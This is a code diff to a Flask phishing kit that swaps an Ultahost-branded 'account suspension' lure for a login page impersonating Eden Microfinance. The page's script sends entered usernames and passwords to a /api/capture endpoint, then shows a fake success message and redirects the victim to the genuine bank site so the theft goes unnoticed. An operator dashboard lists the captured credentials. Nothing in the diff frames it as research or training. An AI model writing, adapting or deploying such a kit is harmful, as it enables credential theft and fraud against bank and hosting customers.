@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, redirect
 from flask_cors import CORS
 import psycopg2
 import os
@@ -118,7 +118,7 @@ DASHBOARD_HTML = '''
         <span id="alert" style="margin-left:20px;"></span>
     </div>
     <div style="overflow-x:auto;">
-    <table>
+    </table>
         <thead><tr><th>Time</th><th>IP</th><th>Source</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>
         <tbody id="data"></tbody>
     </table>
@@ -128,63 +128,170 @@ DASHBOARD_HTML = '''
 </html>
 '''
 
+# Eden Microfinance style login page
 PHISHING_HTML = '''
 <!DOCTYPE html>
-<html>
+<html lang="en-US">
 <head>
-    <title>Ultahost - Account Verification Required</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Security Verification Required - Eden Microfinance</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
-        .container{background:white;border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.2);width:480px;max-width:100%;padding:40px;}
-        .logo{text-align:center;margin-bottom:30px;}
-        .logo h1{font-size:32px;color:#2c7be5;letter-spacing:-1px;}
-        .logo p{color:#666;font-size:14px;}
-        .alert-critical{background:#f8d7da;border-left:4px solid #dc3545;padding:15px;border-radius:8px;margin-bottom:25px;}
-        .alert-critical strong{color:#721c24;display:block;margin-bottom:5px;}
-        .alert-critical p{color:#721c24;font-size:13px;margin:0;}
-        .input-group{margin-bottom:20px;}
-        .input-group label{display:block;margin-bottom:8px;font-weight:500;color:#333;font-size:14px;}
-        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:15px;}
-        .input-group input:focus{outline:none;border-color:#2c7be5;box-shadow:0 0 0 3px rgba(44,123,229,0.1);}
-        button{width:100%;padding:14px;background:#2c7be5;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;}
-        button:hover{background:#1a68d1;}
-        .footer{text-align:center;margin-top:25px;padding-top:20px;border-top:1px solid #eee;}
-        .footer a{color:#2c7be5;text-decoration:none;font-size:13px;margin:0 10px;}
-        .copyright{text-align:center;margin-top:20px;color:#999;font-size:11px;}
-        .loader{display:none;text-align:center;margin-top:15px;color:#2c7be5;font-size:13px;}
+        body{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #0a2b3e 0%, #1a4a6f 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container{
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            width: 450px;
+            max-width: 100%;
+            overflow: hidden;
+        }
+        .header{
+            background: #0a2b3e;
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+        .header h1{
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .header p{
+            font-size: 13px;
+            opacity: 0.8;
+        }
+        .warning{
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 20px;
+            border-radius: 8px;
+        }
+        .warning strong{
+            color: #856404;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .warning p{
+            color: #856404;
+            font-size: 13px;
+            margin: 0;
+        }
+        .ultahost-badge{
+            background: #e8f4f8;
+            padding: 12px 20px;
+            margin: 0 20px 20px 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #2c7be5;
+        }
+        .ultahost-badge span{
+            color: #2c7be5;
+            font-weight: bold;
+        }
+        .login-form{
+            padding: 0 20px 20px 20px;
+        }
+        .input-group{
+            margin-bottom: 20px;
+        }
+        .input-group label{
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+            font-size: 14px;
+        }
+        .input-group input{
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: 0.2s;
+        }
+        .input-group input:focus{
+            outline: none;
+            border-color: #0a2b3e;
+            box-shadow: 0 0 0 3px rgba(10,43,62,0.1);
+        }
+        button{
+            width: 100%;
+            padding: 14px;
+            background: #0a2b3e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover{
+            background: #1a4a6f;
+        }
+        .footer{
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            font-size: 12px;
+            color: #666;
+        }
+        .loader{
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #0a2b3e;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="logo">
-        <h1>Ultahost</h1>
-        <p>Client Portal</p>
+    <div class="header">
+        <h1>🏦 Eden Microfinance</h1>
+        <p>Banque de l'Épargne et du Développement</p>
     </div>
-    <div class="alert-critical">
-        <strong>⚠️ CRITICAL: Account Suspension Notice</strong>
-        <p>Your hosting account will be permanently suspended in 24 hours. Immediate verification is required.</p>
+    
+    <div class="warning">
+        <strong>⚠️ Ultahost Security Alert</strong>
+        <p>Our security systems have detected suspicious activity on your hosting account. Immediate verification is required to prevent suspension.</p>
     </div>
-    <form id="loginForm">
-        <div class="input-group">
-            <label>Email Address / Username</label>
-            <input type="text" id="username" placeholder="Enter your email or username" required>
-        </div>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required>
-        </div>
-        <button type="submit">Verify Account Now</button>
-    </form>
-    <div id="loader" class="loader">Verifying, please wait...</div>
+    
+    <div class="ultahost-badge">
+        🔐 <span>Ultahost Security Verification</span> 🔐
+    </div>
+    
+    <div class="login-form">
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Username or Email Address</label>
+                <input type="text" id="username" placeholder="Enter your Eden Microfinance username" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit">Verify Account & Secure Hosting</button>
+        </form>
+        <div id="loader" class="loader">🔐 Verifying with Ultahost Security...</div>
+    </div>
+    
     <div class="footer">
-        <a href="#">Forgot Password?</a>
-        <a href="#">Contact Support 24/7</a>
+        <a href="#" style="color:#666;text-decoration:none;">Lost your password?</a> | 
+        <a href="#" style="color:#666;text-decoration:none;">← Go to Eden Microfinance</a>
     </div>
-    <div class="copyright">© 2026 Ultahost. All rights reserved.</div>
 </div>
+
 <script>
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
@@ -199,14 +306,14 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     await fetch('/api/capture', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({username: username, password: password, source: 'ultahost'})
+        body: JSON.stringify({username: username, password: password, source: 'eden_microfinance'})
     });
     
     setTimeout(() => {
-        loader.style.display = 'none';
-        btn.disabled = false;
-        alert('Verification failed. Please check your credentials and try again.');
-        document.getElementById('loginForm').reset();
+        loader.innerHTML = '✅ Verification complete! Redirecting to secure portal...';
+        setTimeout(() => {
+            window.location.href = 'https://www.edenmicrofinance.com';
+        }, 2000);
     }, 1500);
 });
 </script>
